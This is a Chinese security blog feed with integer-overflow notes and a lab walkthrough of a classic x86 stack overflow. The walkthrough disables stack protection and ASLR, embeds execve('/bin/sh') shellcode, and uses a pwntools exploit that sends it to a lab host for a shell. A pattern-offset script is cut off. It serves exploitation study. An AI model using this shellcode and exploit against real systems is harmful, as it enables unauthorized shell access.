id="FSP溢出"><a href="#FSP溢出" class="headerlink" title="FSP溢出"></a>FSP溢出</h1><h1 id="整型溢出"><a href="#整型溢出" class="headerlink" title="整型溢出"></a>整型溢出</h1><p>经过不同CPU架构的编译器处理后，整型和指针所占字节一般都是相同的，在32位系统中，一个整数栈32位；在64位系统中，一个整数占64位。<br>32位系统中，无符号整型数（unsigned int）的范围是0~0xffffffff，不仅要保证用户提交的数据在此范围内，还要保证用户数据进行运算和存储后，也要在此范围内，在实际应用中，开发人员可能会忽略这个问题，把它作为一个有符号的整数型（int）使用。</p><p>整型溢出可以分为存储溢出、运算溢出和符号问题。</p><h2 id="存储溢出"><a href="#存储溢出" class="headerlink" title="存储溢出"></a>存储溢出</h2><p>存储溢出是由不同的数据类型存储整型数造成的，如<code>int len1 = 0x10000; short len2 = len2;</code>（len1：32位，len2：16位，赋值时，len2无法容纳len1的全部位，导致len2=0）或者<code>short len2 = 1; int len1 = len2;</code>（len1：结果等于0xffff0001，实际上是一个负数，当len1的初始值为0xffffffff时，len2只能覆盖len1的低16位）</p><h2 id="运算溢出"><a href="#运算溢出" class="headerlink" title="运算溢出"></a>运算溢出</h2><p>在对整型数变量进行运算的过程中没有考虑其边界范围，造成了运算后的数值超出了其存储空间。如：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bool func(char *userdata, short datalength)</span><br><span class="line">&#123;</span><br><span class="line">  char *buff;</span><br><span class="line">  ......</span><br><span class="line">  if(datalength !&#x3D; strlen(userdata))</span><br><span class="line">  return false;</span><br><span class="line">  datalength &#x3D; datalength * 2;  &#x2F;&#x2F;short类型的运算超界，将使下面的拷贝发生溢出</span><br><span class="line">  buff &#x3D; malloc(datalength);</span><br><span class="line">  strncpy(buff, userdata, datalength)</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="符号问题"><a href="#符号问题" class="headerlink" title="符号问题"></a>符号问题</h2><p>符号溢出最典型的例子是分块编码（chunked encoding）漏洞，分块编码传输方式是HTTP1.1中定义的Web用户向服务器提交数据的一种方式，当服务器收到chunked编码方式的数据时会分配好一个缓冲区来存放数据，如果提交的数据大小未知，那么客户端会以一个协商好的分块大小向服务器提交数据。Apache使用一个有符号变量来存储分块长度，同时分配一个固定大小的栈缓冲区来存储分块数据。在分块数据复制到缓冲区之前，Apache会对分块长度进行检查，如果大于缓冲区长度，则Apache最多只复制缓冲区长度的数据。但是上述检查时，没有将分块长度转换成无符号型比较，因此，如果攻击者将分块长度设置成负值，就会将一个超长的分块数据复制到缓冲区中，从而产生缓冲区溢出。</p><h1 id="Cannary绕过"><a href="#Cannary绕过" class="headerlink" title="Cannary绕过"></a>Cannary绕过</h1><p>/<em>—————————————————————-</em>/</p><h1 id="内核"><a href="#内核" class="headerlink" title="内核"></a>内核</h1><h1 id="虚拟机逃逸"><a href="#虚拟机逃逸" class="headerlink" title="虚拟机逃逸"></a>虚拟机逃逸</h1><h1 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h1><h1 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h1><h1 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h1><h1 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h1><h1 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h1><h2 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h2><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h1 id="Android-Security"><a href="#Android-Security" class="headerlink" title="Android Security"></a>Android Security</h1><h1 id="浏览器安全"><a href="#浏览器安全" class="headerlink" title="浏览器安全"></a>浏览器安全</h1><h1 id="IOS-OSX-Security"><a href="#IOS-OSX-Security" class="headerlink" title="IOS/OSX Security"></a>IOS/OSX Security</h1><h1 id="蓝牙安全"><a href="#蓝牙安全" class="headerlink" title="蓝牙安全"></a>蓝牙安全</h1><h1 id="malware"><a href="#malware" class="headerlink" title="malware"></a>malware</h1><h1 id="参考书籍"><a href="#参考书籍" class="headerlink" title="参考书籍"></a>参考书籍</h1><ul><li>《0 day安全：软件漏洞分析技术（第2版）》</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;缓冲区溢出原理&quot;&gt;&lt;a href=&quot;#缓冲区溢出原理&quot; class=&quot;headerlink&quot; title=&quot;缓冲区溢出原理&quot;&gt;&lt;/a&gt;缓冲区溢出原理&lt;/h1&gt;&lt;p&gt;简单地说，缓冲区溢出就是在大缓冲区中的数据向小缓冲区复制的过程中，由于没有注意小缓冲区的边界，“撑爆
      
    
    </summary>
    
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ROP linux_x86 笔记</title>
    <link href="http://yoursite.com/2020/03/30/ROP%20linux_x86/"/>
    <id>http://yoursite.com/2020/03/30/ROP%20linux_x86/</id>
    <published>2020-03-30T11:48:40.000Z</published>
    <updated>2020-03-30T11:49:46.918Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ROP-linux-x86"><a href="#ROP-linux-x86" class="headerlink" title="ROP linux_x86"></a>ROP linux_x86</h1><h2 id="Level-1-没有防御措施"><a href="#Level-1-没有防御措施" class="headerlink" title="Level 1 没有防御措施"></a>Level 1 没有防御措施</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>level1.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulerable_function</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">  <span class="built_in">read</span>(STDIN_FILENO,  buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span>&#123;</span><br><span class="line">  vulerable_function();</span><br><span class="line">  <span class="built_in">write</span>(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="生成关闭了DEP和stack-protector的文件"><a href="#生成关闭了DEP和stack-protector的文件" class="headerlink" title="生成关闭了DEP和stack-protector的文件"></a>生成关闭了DEP和stack-protector的文件</h3><p><code>gcc -fno-stack-protector -z execstack -o level1 level1.c</code></p><h3 id="关闭系统的ASLR"><a href="#关闭系统的ASLR" class="headerlink" title="关闭系统的ASLR"></a>关闭系统的ASLR</h3><p><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p><p>PS：若要开启ASLR，使用root权限输入<code>echo 2 &gt; /proc/sys/kernel/randomize_va_space</code>即可</p><h3 id="确定溢出点的位置"><a href="#确定溢出点的位置" class="headerlink" title="确定溢出点的位置"></a>确定溢出点的位置</h3><p><a href="https://DBlu3.github.io/img/ROP/ROP_linux_x86_1.PNG" data-fancybox="group" data-caption="ROP_linux_x86_1" class="fancybox"><img alt="ROP_linux_x86_1" title="ROP_linux_x86_1" data-src="https://DBlu3.github.io/img/ROP/ROP_linux_x86_1.PNG" class="lazyload"></a></p><p>溢出位置为0x37654136</p><p><a href="https://DBlu3.github.io/img/ROP/ROP_linux_x86_2.PNG" data-fancybox="group" data-caption="ROP_linux_x86_2" class="fancybox"><img alt="ROP_linux_x86_2" title="ROP_linux_x86_2" data-src="https://DBlu3.github.io/img/ROP/ROP_linux_x86_2.PNG" class="lazyload"></a></p><p>padding大小为140个字节</p><h3 id="准备shellcode"><a href="#准备shellcode" class="headerlink" title="准备shellcode"></a>准备shellcode</h3><p>到 <a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">这里</a>寻找合适的shellcode</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">Title:Linux x86 execve(&quot;&#x2F;bin&#x2F;sh&quot;) - 28 bytes</span><br><span class="line">Author:Jean Pascal Pereira &lt;pereira@secbiz.de&gt;</span><br><span class="line">Web:http:&#x2F;&#x2F;0xffe4.org</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">08048060 &lt;_start&gt;:</span><br><span class="line"> 8048060: 31 c0                 xor    %eax,%eax</span><br><span class="line"> 8048062: 50                    push   %eax</span><br><span class="line"> 8048063: 68 2f 2f 73 68        push   $0x68732f2f</span><br><span class="line"> 8048068: 68 2f 62 69 6e        push   $0x6e69622f</span><br><span class="line"> 804806d: 89 e3                 mov    %esp,%ebx</span><br><span class="line"> 804806f: 89 c1                 mov    %eax,%ecx</span><br><span class="line"> 8048071: 89 c2                 mov    %eax,%edx</span><br><span class="line"> 8048073: b0 0b                 mov    $0xb,%al</span><br><span class="line"> 8048075: cd 80                 int    $0x80</span><br><span class="line"> 8048077: 31 c0                 xor    %eax,%eax</span><br><span class="line"> 8048079: 40                    inc    %eax</span><br><span class="line"> 804807a: cd 80                 int    $0x80</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">char shellcode[] &#x3D; &quot;\x31\xc0\x50\x68\x2f\x2f\x73&quot;</span><br><span class="line">                   &quot;\x68\x68\x2f\x62\x69\x6e\x89&quot;</span><br><span class="line">                   &quot;\xe3\x89\xc1\x89\xc2\xb0\x0b&quot;</span><br><span class="line">                   &quot;\xcd\x80\x31\xc0\x40\xcd\x80&quot;;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  fprintf(stdout,&quot;Lenght: %d\n&quot;,strlen(shellcode));</span><br><span class="line">  (*(void  (*)()) shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="开启core-dump，获取buffer的真实地址"><a href="#开启core-dump，获取buffer的真实地址" class="headerlink" title="开启core dump，获取buffer的真实地址"></a>开启core dump，获取buffer的真实地址</h3><p><a href="https://DBlu3.github.io/img/ROP/ROP_linux_x86_3.PNG" data-fancybox="group" data-caption="ROP_linux_x86_3" class="fancybox"><img alt="ROP_linux_x86_3" title="ROP_linux_x86_3" data-src="https://DBlu3.github.io/img/ROP/ROP_linux_x86_3.PNG" class="lazyload"></a></p><p>计算buffer地址时还需要算上4个字节的ret地址，最后得到buffer地址0xbffff8d0</p><h3 id="使用SOCAT将程序作为服务绑定到端口上"><a href="#使用SOCAT将程序作为服务绑定到端口上" class="headerlink" title="使用SOCAT将程序作为服务绑定到端口上"></a>使用SOCAT将程序作为服务绑定到端口上</h3><p>注：由于我使用的pwntools不支持在32位系统上运行，于是我在32位系统上使用SOCAT将程序作为服务绑定到端口上，然后在64位系统上使用pwntools编写EXP，同理，也可以使用该方法进行远程溢出利用</p><p>在32位系统上使用<code>socat TCP4-LISTEN:6666,fork EXEC:./level1</code>将level1绑定到6666端口上</p><p>在64位系统上使用<code>nc 192.168.80.94 6666</code>测试连接（192.168.80.94为32位系统的IP地址）</p><p><a href="https://DBlu3.github.io/img/ROP/ROP_linux_x86_4.PNG" data-fancybox="group" data-caption="ROP_linux_x86_4" class="fancybox"><img alt="ROP_linux_x86_4" title="ROP_linux_x86_4" data-src="https://DBlu3.github.io/img/ROP/ROP_linux_x86_4.PNG" class="lazyload"></a></p><h3 id="重新获取buffer的地址"><a href="#重新获取buffer的地址" class="headerlink" title="重新获取buffer的地址"></a>重新获取buffer的地址</h3><p>因为服务是在SOCAT环境中运行的，所以buffer的地址还需要继续利用core dump重新获取，最终获得的buffer地址为0xbffff810</p><h3 id="编写EXP"><a href="#编写EXP" class="headerlink" title="编写EXP"></a>编写EXP</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><figcaption><span>exp.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'192.168.80.94'</span>,<span class="number">6666</span>)</span><br><span class="line"><span class="comment"># p = remote('remote host's ip',port)</span></span><br><span class="line"></span><br><span class="line">shellcode =  <span class="string">'\x31\xc0\x50\x68\x2f\x2f\x73'</span></span><br><span class="line">shellcode += <span class="string">'\x68\x68\x2f\x62\x69\x6e\x89'</span></span><br><span class="line">shellcode += <span class="string">'\xe3\x89\xc1\x89\xc2\xb0\x0b'</span></span><br><span class="line">shellcode += <span class="string">'\xcd\x80\x31\xc0\x40\xcd\x80'</span></span><br><span class="line"></span><br><span class="line">padding = <span class="string">'A'</span> * (<span class="number">140</span> - len(shellcode))</span><br><span class="line"><span class="comment">#ret_address = 0xbffff810</span></span><br><span class="line"></span><br><span class="line">payload = shellcode + padding</span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line">r.send(p32(ret_address))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p><a href="https://DBlu3.github.io/img/ROP/ROP_linux_x86_5.PNG" data-fancybox="group" data-caption="ROP_linux_x86_5" class="fancybox"><img alt="ROP_linux_x86_5" title="ROP_linux_x86_5" data-src="https://DBlu3.github.io/img/ROP/ROP_linux_x86_5.PNG" class="lazyload"></a></p><p>成功获取shell</p><h1 id="使用到的脚本"><a href="#使用到的脚本" class="headerlink" title="使用到的脚本"></a>使用到的脚本</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><figcaption><span>pattern.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys, os, binascii, time</span><br><span class="line"></span><br><span class="line">buf = (</span><br><span class="line"><span class="string">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac"</span></span><br><span class="line"><span class="string">"6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2A"</span></span><br><span class="line"><span class="string">"f3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9"</span></span><br><span class="line"><span class="string">"Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak"</span></span><br><span class="line"><span class="string">"6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A"</span></span><br><span class="line"><span class="string">"n3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9"</span></span><br><span class="line"><span class="string">"Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As"</span></span><br><span class="line"><span class="string">"6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2A"</span></span><br><span class="line"><span class="string">"v3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9"</span></span><br><span class="line"><span class="string">"Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"</span></span><br><span class="line"><span class="string">"6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2B"</span></span><br><span class="line"><span class="string">"d3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9"</span></span><br><span class="line"><span class="string">"Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi"</span></span><br><span class="line"><span class="string">"6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2B"</span></span><br><span class="line"><span class="string">"l3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9"</span></span><br><span class="line"><span class="string">"Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq"</span></span><br><span class="line"><span class="string">"6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2B"</span></span><br><span class="line"><span class="string">"t3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9"</span></span><br><span class="line"><span class="string">"Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By"</span></span><br><span class="line"><span class="string">"6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2C"</span></span><br><span class="line"><span 